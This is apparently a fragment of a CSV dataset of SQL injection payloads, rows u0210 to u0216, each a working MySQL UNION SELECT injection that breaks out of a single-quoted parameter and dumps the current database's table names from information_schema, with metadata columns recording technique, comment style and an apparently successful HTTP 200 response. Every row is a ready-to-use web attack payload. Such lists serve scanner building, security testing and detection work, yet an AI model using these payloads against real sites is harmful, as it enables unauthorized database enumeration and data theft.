u0210,"-1' UNION ALL SELECT (SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE()),'SEQSQLI_START','SEQSQLI_END'#",union,complex,single_quote,3,hash,2,3,"(SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE())",all,,yes,200,726,
u0211,"-1' UNION DISTINCT SELECT (SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE()),'SEQSQLI_START','SEQSQLI_END'#",union,complex,single_quote,3,hash,2,3,"(SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE())",distinct,,yes,200,726,
u0212,"-1' UNION DISTINCTROW SELECT (SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE()),'SEQSQLI_START','SEQSQLI_END'#",union,complex,single_quote,3,hash,2,3,"(SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE())",distinctrow,,yes,200,726,
u0213,"-1' UNION SELECT (SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE()),'SEQSQLI_START','SEQSQLI_END'--+",union,complex,single_quote,3,dashplus,2,3,"(SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE())",plain,,yes,200,726,
u0214,"-1' UNION ALL SELECT (SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE()),'SEQSQLI_START','SEQSQLI_END'--+",union,complex,single_quote,3,dashplus,2,3,"(SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE())",all,,yes,200,726,
u0215,"-1' UNION DISTINCT SELECT (SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE()),'SEQSQLI_START','SEQSQLI_END'--+",union,complex,single_quote,3,dashplus,2,3,"(SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE())",distinct,,yes,200,726,
u0216,"-1' UNION DISTINCTROW SELECT (SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE()),'SEQSQLI_START','SEQSQLI_END'--+",union,complex,single_quote,3,dashplus,2,3,"(SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE())",distinctrow,,yes,200,726,
